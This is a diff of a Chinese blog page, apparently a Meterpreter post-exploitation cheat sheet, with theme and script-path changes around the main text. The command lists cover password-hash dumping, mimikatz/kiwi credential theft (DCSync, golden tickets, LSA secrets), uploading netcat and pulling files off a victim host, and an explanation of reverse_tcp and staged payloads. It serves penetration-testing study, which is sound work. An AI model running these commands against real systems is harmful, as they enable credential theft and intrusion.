<span class="comment">#在目标机中执行文件 例：execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span></span><br><span class="line">查看当前处于目标机的那个目录：<span class="built_in">pwd</span></span><br><span class="line">查看当前目录：getlwd</span><br><span class="line">导出当前用户密码哈希 run hashdump</span><br><span class="line">用户名：SID：LM哈希：NTLM哈希:::</span><br><span class="line">也可以使用下面这个命令导出 权限更高  run windows/gather/smart_hashdump</span><br><span class="line">抓取自动登录的用户名和密码 run windows/gather/credentials/windows_autologin</span><br><span class="line">直接获取明文密码（注意这个功能需要获取系统权限 获取系统权限需要输入getsystem）</span><br><span class="line">首选终端输入 load kiwi  加载kiwi</span><br><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure></div>
 
 
 
-<h3 id="3-文件系统命令"><a href="#3-文件系统命令" class="headerlink" title="3.文件系统命令"></a>3.文件系统命令</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cat c:\boot.ini#查看文件内容,文件必须存在</span><br><span class="line">del c:\boot.ini #删除指定的文件</span><br><span class="line">upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload setup.exe C:\\windows\\system32</span><br><span class="line">download nimeia.txt /root/Desktop/  # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\&quot;ProgramFiles&quot;\\Tencent\\QQ\\Users\\295***\**\*******125\\Msg2.0.db /root/**</span><br><span class="line">**edit c:\boot.ini** # 编辑文件</span><br><span class="line">getlwd#打印本地目录</span><br><span class="line">getwd#打印工作目录</span><br><span class="line">lcd#更改本地目录</span><br><span class="line">ls#列出在当前目录中的文件列表</span><br><span class="line">lpwd#打印本地目录</span><br><span class="line">pwd#输出工作目录</span><br><span class="line">cd c:\\ #进入目录文件下</span><br><span class="line">rm file #删除文件</span><br><span class="line">mkdir dier #在受害者系统上的创建目录</span><br><span class="line">rmdir#受害者系统上删除目录</span><br><span class="line">dir#列出目标主机的文件和文件夹信息</span><br><span class="line">mv#修改目标主机上的文件名</span><br><span class="line">search -d d:\\www -f web.config #search 文件，如search -d c:\\ -f**.doc*</span><br><span class="line">*meterpreter &gt; search -f autoexec.bat* #搜索文件</span><br><span class="line">meterpreter &gt; search -f sea**.bat c:\\xamp\\*</span><br><span class="line">*enumdesktops*   #用户登录数</span><br></pre></td></tr></table></figure></div>
+<h3 id="3-文件系统命令"><a href="#3-文件系统命令" class="headerlink" title="3.文件系统命令"></a>3.文件系统命令</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cat c:\boot.ini#查看文件内容,文件必须存在</span><br><span class="line">del c:\boot.ini #删除指定的文件</span><br><span class="line">upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload setup.exe C:\\windows\\system32</span><br><span class="line">download nimeia.txt /root/Desktop/  # 下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\&quot;ProgramFiles&quot;\\Tencent\\QQ\\Users\\295***\**\*******125\\Msg2.0.db /root/**</span><br><span class="line">**edit c:\boot.ini** # 编辑文件</span><br><span class="line">getlwd#打印本地目录</span><br><span class="line">getwd#打印工作目录</span><br><span class="line">lcd#更改本地目录</span><br><span class="line">ls#列出在当前目录中的文件列表</span><br><span class="line">lpwd#打印本地目录</span><br><span class="line">pwd#输出工作目录</span><br><span class="line">cd c:\\ #进入目录文件下</span><br><span class="line">rm file #删除文件</span><br><span class="line">mkdir dier #在受害者系统上的创建目录</span><br><span class="line">rmdir#受害者系统上删除目录</span><br><span class="line">dir#列出目标主机的文件和文件夹信息</span><br><span class="line">mv#修改目标主机上的文件名</span><br><span class="line">search -d d:\\www -f web.config #search 文件，如search -d c:\\ -f**.doc*</span><br><span class="line">*meterpreter &gt; search -f autoexec.bat* #搜索文件</span><br><span class="line">meterpreter &gt; search -f sea**.bat c:\\xamp\\*</span><br><span class="line">*enumdesktops*   #用户登录数</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="Meterpreter中常用的反弹类型"><a href="#Meterpreter中常用的反弹类型" class="headerlink" title="Meterpreter中常用的反弹类型"></a>Meterpreter中常用的反弹类型</h2><p>1.reverse_tcp</p>
 <p>这是一个基于TCP的反向链接反弹shell, 使用起来很稳定</p>
@@ -493,7 +492,7 @@
 <p>-Single</p>
 <p>-Stager</p>
 <p>-Stage</p>
-<p>Single是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似<a class="link" target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>这样的非metasploit处理工具所捕捉到。</p>
+<p>Single是一种完全独立的Payload，而且使用起来就像运行calc.exe一样简单，例如添加一个系统用户或删除一份文件。由于Single Payload是完全独立的，因此它们有可能会被类似<a class="link" target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Netcat">netcat<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>这样的非metasploit处理工具所捕捉到。</p>
 <p>Stager这种Payload负责建立目标用户与攻击者之间的网络连接，并下载额外的组件或应用程序。一种常见的Stagers Payload就是reverse_tcp，它可以让目标系统与攻击者建立一条tcp连接。另一种常见的是bind_tcp，它可以让目标系统开启一个tcp监听器，而攻击者随时可以与目标系统进行通信。</p>
 <p>Stage是Stager Payload下载的一种Payload组件，这种Payload可以提供更加高级的功能，而且没有大小限制。</p>
 <p>在Metasploit中，我们可以通过Payload的名称和使用格式来推断它的类型：</p>
@@ -502,24 +501,24 @@
 <p>当我们在Metasploit中执行“show payloads”命令之后，它会给我们显示一个可使用的Payload列表：</p>
 <p>  在这个列表中，windows&#x2F;powershell_bind_tcp就是一个Single Payload，它不包含Stage Payload。而windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp则由一个Stager Payload（reverse_tcp）和一个Stage Payload（meterpreter）组成。</p>
 
-        
-    </div>
-    <div class="page-template-comments">
-        
-    </div>
+	</div>
+
+	<div class="page-template-comments">
+		
+	</div>
 </div>
 
+<div class="paginator">
+	
+</div>
+  
+			</div>
 
-                
+			
+		</div>
 
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
     <div class="info-container py-3 text-center">
         
             <div class="customize-info my-1">The function of man is to live, not to exist.I shall not waste my days trying to prolong them. I shall use my time.</div>
@@ -564,7 +563,7 @@
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
             <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
-            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
         </div>
         
         
@@ -593,74 +592,72 @@
         
     </div>  
 </footer>
-        </div>
-    </div>
+		</div>
+	</div>
 
-    
+	
 
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
 
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
 
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
 
-        <!-- rss -->
-        
+		<!-- rss -->
+		
 
-        
+		
 
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
 
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog fa-spin"></i>
-        </li>
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="arrow-up fas fa-arrow-up"></i>
-                <span class="percent"></span>
-            </li>
-        
-        
-    </ul>
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
 </div>
 
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
+	
 
 </main>
 
 
-    
-<script src="/js/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
+<script src="/js/build/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
 
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
 
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
 
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
 
 <script>
     const swup = new Swup({
@@ -683,45 +680,42 @@
 
 
 
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
 
+<script src="/js/build/utils.js" type="module"></script>
 
+<script src="/js/build/main.js" type="module"></script>
 
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
 
-<script src="/js/tools/imageViewer.js" type="module"></script>
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
 
-<script src="/js/utils.js" type="module"></script>
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
 
-<script src="/js/main.js" type="module"></script>
-
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
 
 
 
 
 
     
-<script src="/js/tools/codeBlock.js" type="module"></script>
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
 
 
 
 
     
-<script src="/js/layouts/lazyload.js" type="module"></script>
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
 
 
 
 
     
-<script src="/js/tools/runtime.js"></script>
+<script src="/js/build/tools/runtime.js"></script>
 
     
-<script src="/js/libs/odometer.min.js"></script>
+<script src="/js/build/libs/odometer.min.js"></script>
 
     
 <link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
@@ -730,10 +724,10 @@
 
 
   
-<script src="/js/libs/Typed.min.js"></script>
+<script src="/js/build/libs/Typed.min.js"></script>
 
   
-<script src="/js/plugins/typed.js" type="module"></script>
+<script src="/js/build/plugins/typed.js" type="module"></script>
 
 
 
@@ -743,22 +737,32 @@
 
 
     
-<script src="/js/libs/anime.min.js"></script>
+<script src="/js/build/libs/anime.min.js"></script>
 
 
 
-<div class="post-scripts" data-swup-reload-script>
-    
-        
-<script src="/js/tools/tocToggle.js" type="module"></script>
 
-<script src="/js/layouts/toc.js" type="module"></script>
-
-<script src="/js/plugins/tabs.js" type="module"></script>
 
     
-</div>
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
 
 
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
 </body>
+
 </html>
